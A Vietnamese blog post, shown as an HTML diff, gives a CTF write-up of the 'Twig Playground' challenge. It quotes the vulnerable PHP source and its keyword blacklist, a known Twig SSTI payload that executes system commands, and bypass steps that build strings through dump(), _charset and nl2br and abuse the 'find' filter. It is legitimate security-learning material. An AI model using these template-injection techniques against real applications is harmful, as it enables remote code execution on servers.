@@ -1,0 +1,251 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Trong giải CyberSpace này thì team mình đã đạt thứ hạng khá cao là top 2. Nói riêng về mảng web thì team mình còn 1 bài web logic là không kịp làm, cá nhân mình không tự solve được bài nào cả, và bài Twig Playgound là challenge mà mình tốn nhiều thời gian để làm nhất (nhưng vẫn không solve được) Khi merge lại để chơi chung thì điểm lợi sẽ là mình được trao đổi, học hỏi kiến thức của những teammates khác. Từ đó giảm thiểu việc mình lún quá sâu vào các rabbithole hoặc đi sai hướng. Nhưng nó đã hại mình khá nhiều vì tạo cho mình thói quen xem hướng của anh em trước, khiến việc spot vuln và hàm lỗi của mình trở nên rất kém. Điều này mình đã và đang cố gắng khắc phục, kết quả giải này cho thấy quá trình này vẫn còn rất dài khi mình vẫn chưa thể tự mình làm được 1 challenge nào một cách hẳn hoi. Mình viết lại write up này cũng chỉ chia sẻ lại góc nhìn của mình về challenge, cũng như những kiến thức mình học được vì mình ấn tượng nhất và thấy bài này khá hay. Thôi không dài dòng nữa, bắt đầu thôi!\n"><title>CyberSpace CTF 2024 write up - Twig Playground</title><link rel=canonical href=https://kev1n1203.github.io/p/cyberspace-ctf-2024/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="CyberSpace CTF 2024 write up - Twig Playground"><meta property='og:description' content="Trong giải CyberSpace này thì team mình đã đạt thứ hạng khá cao là top 2. Nói riêng về mảng web thì team mình còn 1 bài web logic là không kịp làm, cá nhân mình không tự solve được bài nào cả, và bài Twig Playgound là challenge mà mình tốn nhiều thời gian để làm nhất (nhưng vẫn không solve được) Khi merge lại để chơi chung thì điểm lợi sẽ là mình được trao đổi, học hỏi kiến thức của những teammates khác. Từ đó giảm thiểu việc mình lún quá sâu vào các rabbithole hoặc đi sai hướng. Nhưng nó đã hại mình khá nhiều vì tạo cho mình thói quen xem hướng của anh em trước, khiến việc spot vuln và hàm lỗi của mình trở nên rất kém. Điều này mình đã và đang cố gắng khắc phục, kết quả giải này cho thấy quá trình này vẫn còn rất dài khi mình vẫn chưa thể tự mình làm được 1 challenge nào một cách hẳn hoi. Mình viết lại write up này cũng chỉ chia sẻ lại góc nhìn của mình về challenge, cũng như những kiến thức mình học được vì mình ấn tượng nhất và thấy bài này khá hay. Thôi không dài dòng nữa, bắt đầu thôi!\n"><meta property='og:url' content='https://kev1n1203.github.io/p/cyberspace-ctf-2024/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2024-09-03T16:46:31+00:00'><meta property='article:modified_time' content='2024-09-03T16:46:31+00:00'><meta name=twitter:title content="CyberSpace CTF 2024 write up - Twig Playground"><meta name=twitter:description content="Trong giải CyberSpace này thì team mình đã đạt thứ hạng khá cao là top 2. Nói riêng về mảng web thì team mình còn 1 bài web logic là không kịp làm, cá nhân mình không tự solve được bài nào cả, và bài Twig Playgound là challenge mà mình tốn nhiều thời gian để làm nhất (nhưng vẫn không solve được) Khi merge lại để chơi chung thì điểm lợi sẽ là mình được trao đổi, học hỏi kiến thức của những teammates khác. Từ đó giảm thiểu việc mình lún quá sâu vào các rabbithole hoặc đi sai hướng. Nhưng nó đã hại mình khá nhiều vì tạo cho mình thói quen xem hướng của anh em trước, khiến việc spot vuln và hàm lỗi của mình trở nên rất kém. Điều này mình đã và đang cố gắng khắc phục, kết quả giải này cho thấy quá trình này vẫn còn rất dài khi mình vẫn chưa thể tự mình làm được 1 challenge nào một cách hẳn hoi. Mình viết lại write up này cũng chỉ chia sẻ lại góc nhìn của mình về challenge, cũng như những kiến thức mình học được vì mình ấn tượng nhất và thấy bài này khá hay. Thôi không dài dòng nữa, bắt đầu thôi!\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Hậu - Thành viên ăn hại tại KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#preface>Preface</a></li><li><a href=#source-code-analysis>Source Code Analysis</a><ol><li><a href=#dockerfile>Dockerfile</a></li><li><a href=#indexphp>Index.php</a></li></ol></li><li><a href=#bypass>Bypass</a><ol><li><a href=#craft-string-in-twig-using--set-->Craft String in Twig using {% set &mldr; %}</a></li><li><a href=#find-twig-filters-to-rce>Find Twig filters to RCE</a><ol><li><a href=#find>find</a></li><li><a href=#has-some>has some</a></li></ol></li></ol></li><li><a href=#final-payload--exploit>Final Payload & Exploit</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/cyberspace-ctf-2024/>CyberSpace CTF 2024 write up - Twig Playground</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-09-03T16:46:31Z>Sep 03, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>10 minute read</time></div></footer></div></header><section class=article-content><p>Trong giải CyberSpace này thì team mình đã đạt thứ hạng khá cao là top 2. Nói riêng về mảng web thì team mình còn 1 bài web logic là không kịp làm, cá nhân mình không tự solve được bài nào cả, và bài Twig Playgound là challenge mà mình tốn nhiều thời gian để làm nhất (nhưng vẫn không solve được)
+Khi merge lại để chơi chung thì điểm lợi sẽ là mình được trao đổi, học hỏi kiến thức của những teammates khác. Từ đó giảm thiểu việc mình lún quá sâu vào các rabbithole hoặc đi sai hướng. Nhưng nó đã hại mình khá nhiều vì tạo cho mình thói quen xem hướng của anh em trước, khiến việc spot vuln và hàm lỗi của mình trở nên rất kém. Điều này mình đã và đang cố gắng khắc phục, kết quả giải này cho thấy quá trình này vẫn còn rất dài khi mình vẫn chưa thể tự mình làm được 1 challenge nào một cách hẳn hoi.
+Mình viết lại write up này cũng chỉ chia sẻ lại góc nhìn của mình về challenge, cũng như những kiến thức mình học được vì mình ấn tượng nhất và thấy bài này khá hay. Thôi không dài dòng nữa, bắt đầu thôi!</p><h2 id=preface>Preface</h2><p><img src=https://hackmd.io/_uploads/H1fDp8V2A.png loading=lazy alt=image><br>Đề bài rất straightforward, là một website để render Twig template online, thì mình cũng hiểu được là phải khai thác lỗi SSTI tại challenge này.</p><h2 id=source-code-analysis>Source Code Analysis</h2><h3 id=dockerfile>Dockerfile</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>COPY ./flag /flag
+</span></span><span class=line><span class=cl>RUN mv /flag /flag-$(head -c 30 /dev/urandom | xxd -p | tr -dc &#39;a-f&#39; | head -c 10)
+</span></span></code></pre></td></tr></table></div></div><p>Flag được move vào / và đổi tên, yêu cầu đưa ra chắc chắn là RCE</p><h3 id=indexphp>Index.php</h3><p>Source của challenge rất đơn giản, đưa thẳng input của user vào template để render, nhưng điều mình chú ý là cái đống blacklist này là quá đủ để đá hết các payload của Hacktrick và PayloadAllTheThings ra chuồng gà</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span><span class=n>loader</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>Twig</span>\<span class=n>Loader</span>\<span class=n>ArrayLoader</span><span class=p>([]);</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>twig</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>Twig</span>\<span class=ne>Environment</span><span class=p>(</span><span class=o>$</span><span class=n>loader</span><span class=p>,</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;debug&#39;</span> <span class=o>=&gt;</span> <span class=bp>true</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>twig</span><span class=o>-&gt;</span><span class=n>addExtension</span><span class=p>(</span><span class=n>new</span> \<span class=n>Twig</span>\<span class=n>Extension</span>\<span class=n>DebugExtension</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>context</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;user&#39;</span> <span class=o>=&gt;</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;name&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Wesley&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;age&#39;</span> <span class=o>=&gt;</span> <span class=mi>30</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>],</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;items&#39;</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=s1>&#39;Apple&#39;</span><span class=p>,</span> <span class=s1>&#39;Banana&#39;</span><span class=p>,</span> <span class=s1>&#39;Cherry&#39;</span><span class=p>,</span> <span class=s1>&#39;Dragonfruit&#39;</span><span class=p>],</span>
+</span></span><span class=line><span class=cl><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>Ensure</span> <span class=n>no</span> <span class=n>SSTI</span> <span class=ow>or</span> <span class=n>RCE</span> <span class=n>vulnerabilities</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>,</span> <span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=s1>&#39;passthru&#39;</span><span class=p>,</span> <span class=s1>&#39;exec&#39;</span><span class=p>,</span> <span class=s1>&#39;shell_exec&#39;</span><span class=p>,</span> <span class=s1>&#39;popen&#39;</span><span class=p>,</span> <span class=s1>&#39;proc_open&#39;</span><span class=p>,</span> <span class=s1>&#39;pcntl_exec&#39;</span><span class=p>,</span> <span class=s1>&#39;_self&#39;</span><span class=p>,</span> <span class=s1>&#39;reduce&#39;</span><span class=p>,</span> <span class=s1>&#39;env&#39;</span><span class=p>,</span> <span class=s1>&#39;sort&#39;</span><span class=p>,</span> <span class=s1>&#39;map&#39;</span><span class=p>,</span> <span class=s1>&#39;filter&#39;</span><span class=p>,</span> <span class=s1>&#39;replace&#39;</span><span class=p>,</span> <span class=s1>&#39;encoding&#39;</span><span class=p>,</span> <span class=s1>&#39;include&#39;</span><span class=p>,</span> <span class=s1>&#39;file&#39;</span><span class=p>,</span> <span class=s1>&#39;run&#39;</span><span class=p>,</span> <span class=s1>&#39;Closure&#39;</span><span class=p>,</span> <span class=s1>&#39;Callable&#39;</span><span class=p>,</span> <span class=s1>&#39;Process&#39;</span><span class=p>,</span> <span class=s1>&#39;Symfony&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\&#39;</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;&#34;&#39;</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=s1>&#39;;&#39;</span><span class=p>,</span> <span class=s1>&#39;[&#39;</span><span class=p>,</span> <span class=s1>&#39;]&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=s1>&#39;-&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>templateContent</span> <span class=o>=</span> <span class=o>$</span><span class=n>_POST</span><span class=p>[</span><span class=s1>&#39;input&#39;</span><span class=p>]</span> <span class=err>??</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>foreach</span> <span class=p>(</span><span class=o>$</span><span class=n>blacklist</span> <span class=n>as</span> <span class=o>$</span><span class=n>item</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>stripos</span><span class=p>(</span><span class=o>$</span><span class=n>templateContent</span><span class=p>,</span> <span class=o>$</span><span class=n>item</span><span class=p>)</span> <span class=o>!==</span> <span class=bp>false</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>die</span><span class=p>(</span><span class=s2>&#34;Error: The input contains forbidden content: &#39;$item&#39;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>template</span> <span class=o>=</span> <span class=o>$</span><span class=n>twig</span><span class=o>-&gt;</span><span class=n>createTemplate</span><span class=p>(</span><span class=o>$</span><span class=n>templateContent</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>result</span> <span class=o>=</span> <span class=o>$</span><span class=n>template</span><span class=o>-&gt;</span><span class=n>render</span><span class=p>(</span><span class=o>$</span><span class=n>context</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>echo</span> <span class=s1>&#39;&lt;h2&gt;Rendered Output:&lt;/h2&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>echo</span> <span class=s1>&#39;&lt;div class=&#34;output&#34;&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>echo</span> <span class=n>htmlspecialchars</span><span class=p>(</span><span class=o>$</span><span class=n>result</span><span class=p>);</span>  <span class=o>//</span> <span class=n>Ensure</span> <span class=n>no</span> <span class=n>XSS</span> <span class=n>vulnerabilities</span>
+</span></span><span class=line><span class=cl>    <span class=n>echo</span> <span class=s1>&#39;&lt;/div&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>catch</span><span class=p>(</span><span class=n>Exception</span> <span class=o>$</span><span class=n>e</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>echo</span> <span class=s1>&#39;&lt;div class=&#34;error&#34;&gt;Something went wrong! Try again.&lt;/div&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>Ngoài ra tại đây mình thấy họ bật cả DebugExtension(), thì mình có thể sử dụng hàm dump() có tác dụng như hàm var_dump() trong PHP chuyên dùng để xem dữ liệu đầu ra. Tại đây thì mình có thể dump một số thông tin có trong template hiện tại như <code>_self(đã bị cấm), _context, _charset,...</code></li></ul><p>Với Twig template thì việc khai thác SSTI chủ yếu phụ thuộc vào cơ chế filter data của Twig cho phép biến đổi dữ liệu tùy theo mục đích sử dụng template. Dữ liệu đi qua filter thông qua dấu <code>|</code>, ví dụ <code>{{data|filter(args..)}}</code>. Một số filter thông dụng là slice, upper, lower, join. Nhưng bên cạnh đó có một số filter phổ biến bởi có thể lợi dụng nó để RCE, điểm chung của các filter này là chuyên dùng để xử lý mảng, và mình có thể truyền vào một hàm mũi tên cụ thể để tùy biến quá trình xử lý dữ liệu theo ý mình thích biểu diễn bằng hàm mũi tên. Lúc này mình có thể truyền vào hàm là một system function để thực thi các câu lệnh, còn data sẽ là command, từ đó ta mới có các payload SSTI trên HackTrick sẽ tự tựa nhe kiểu:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{{[&#34;id&#34;]|filter(&#34;system&#34;)}}
+</span></span></code></pre></td></tr></table></div></div><p>Ngoài ra có thể kể đến các filter như: map, sort, filter, reduce -> đều đã bị cấm hết. Tất nhiên, với đống blacklist kia thì mấy payload như này không hoạt động. Nên mình đã đi tìm cách để craft được payload như thế này, nhưng việc khai báo string với mảng là không thể vì chall cũng đã cấm dấu ngoặc vuông là 2 kiểu nháy. Điều này làm mình bế tắc trong 1 khoảng thời gian dài mà không tìm được cách nào, nó làm mình mông lung không xác định được trọng tâm cần phải làm những gì để RCE được challenge này.
+Sau khi teammate tìm ra được cách để nối chuỗi là sử dụng dump() và ghép các ký tự trong đấy để thành chuỗi, mình mới xác định được 2 bước cần làm để solve challenge:</p><ul><li>Tìm được cách nối chuỗi các ký tự tùy ý để không phụ thuộc vào context do context giới hạn số lượng từ ngữ.</li><li>Tìm filter có tác dụng RCE tương tự như các filter đã bị blacklist</li></ul><h2 id=bypass>Bypass</h2><h3 id=craft-string-in-twig-using--set-->Craft String in Twig using {% set &mldr; %}</h3><p>Với việc cấm tất cả dấu nháy, việc khai báo một string hay array cơ bản là không thể. Tuy nhiên ta có thể dụng dấu <code>~</code> để nối chuỗi các string với nhau hoặc các <strong>biến</strong> với nhau. Nên ý tưởng ban đầu là sử dump() -> var_dump ra context hiện tại, dùng slice để lấy từng ký tự trong chuỗi trả ra và nối chúng lại với nhau thành chuỗi.
+<img src=https://hackmd.io/_uploads/HkN6MqVhC.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/HyfaXq4hC.png loading=lazy alt=image><br>Với cách này ta có thể tạo thành string, tuy nhiên bị giới hạn về mặt từ ngữ, và việc ghép từng ký tự theo số như này rất mệt, nhất là việc flag có nhiều ký tự như kia mà ta không có ký tự * thì nối đến chết :skull:
+Thay vì lấy từ dump, ta có thể sử dụng <code>{}</code> để một tham số thành mảng, nơi giá trị của tham số là value của nó:
+<img src=https://hackmd.io/_uploads/SkOwrcE3A.png loading=lazy alt=image><br>Kết hợp nó với dump thì ta có:
+<img src=https://hackmd.io/_uploads/rybTHqE2C.png loading=lazy alt=image><br>Tên tham số sytem được đưa vào mảng, với giá trị tương ứng là giá trị của tham số sytem và = NULL -> slice mảng này sẽ dễ hơn slice từng kí tự một khi sử dụng <code>dump()</code>
+Vậy là ta có thể craft ra các ký tự rồi, nhưng flag nằm ở / và flag cũng chứa dấu - thì ta phải xử lý như thế nào. Khi <code>_context</code> không chứa dấu / và nếu ta cũng không thể đưa dấu <code>*</code> vào bên trong <code>dump({})</code> vì như thế sẽ lỗi ngay:
+<img src=https://hackmd.io/_uploads/HJkUUcEnC.png loading=lazy alt=image><br>Vậy nhiệm vụ tiếp theo là cần dấu <code>/</code> và dấu <code>-</code> bằng cách tiếp tục sử dụng <code>dump()</code>
+Với dấu <code>-</code> thì trong <code>_charset</code> ta sẽ thấy có xuất hiện dấu đó nằm trong chuỗi <code>UTF-8</code>. Ta lấy ký tự thứ 4, tương ứng với slice(3,1) vì vị trí string bắt đầu đếm từ 0 để lấy dấu <code>-</code> ra:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{% set hyphen = _charset|slice(3,1) %}
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/HksWD5V30.png loading=lazy alt=image><br>Còn dấu <code>/</code> thì ta có thể lấy ký tự xuống dòng (sẽ xuất hiện khi dump) sau đó thêm filter <code>nl2br</code> để chuyển ký tự xuống dòng thành thẻ HTML <code>&lt;br/></code>, tiếp tục sử dụng filter <code>raw</code> để giữ nguyên thẻ không bị html encode, rồi slice lấy dấu <code>/</code> bên trong thẻ br:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %}
+</span></span></code></pre></td></tr></table></div></div><p>Ngoài cách sử dụng <code>{}</code>, ta cũng có thể sử dụng filter split chuỗi đầu vào với ký tự không tồn tại trong chuỗi để chuyển chuỗi thành mảng, vì công dụng của split là chia chuỗi thành mảng các phần tử theo ký tự xác định
+<img src=https://hackmd.io/_uploads/S18kYqEnR.png loading=lazy alt=image><br></p><h3 id=find-twig-filters-to-rce>Find Twig filters to RCE</h3><h4 id=find>find</h4><p>Công cụ đã có đủ cả, giờ thứ mình và đồng đội đã stuck rất lâu mới tìm ra, đó là filters phù hợp để có thể RCE.
+Biết được phiên bản Twig đang sử dụng là 3.12, mình tìm kiếm nhưng kết quả no hope, cày hết cái doc các filters của Twig thì toàn cái không dùng được, những cái dùng được đều bị blacklist hết.
+Bí ngòi cả 1 ngày thì teammate tìm ra filter <code>find</code> có thể được sử dụng để RCE:
+<img src=https://hackmd.io/_uploads/HJsPKcEh0.png loading=lazy alt=image><br>Về cách sử dụng thì y chang các filter đã bị blacklist, tự hỏi tại sao nó không ở trong doc thì có lẽ doc upadte chưa tới do filter này mới được thêm vào tại phiên bản 3.11:<br><img src=https://hackmd.io/_uploads/BJWa55Vn0.png loading=lazy alt=image><br>Filter này nằm tại file <code>/Twig/src/Extension/CoreExtension.php</code>, là một trong các filter có sẵn của Twig, đoạn code xử lý filter này sẽ như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public function getFilters(): array
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>    ...
+</span></span><span class=line><span class=cl>    // array helpers
+</span></span><span class=line><span class=cl>    new TwigFilter(&#39;find&#39;, [self::class, &#39;find&#39;], [&#39;needs_environment&#39; =&gt; true]),
+</span></span><span class=line><span class=cl>    ...
+</span></span><span class=line><span class=cl>}
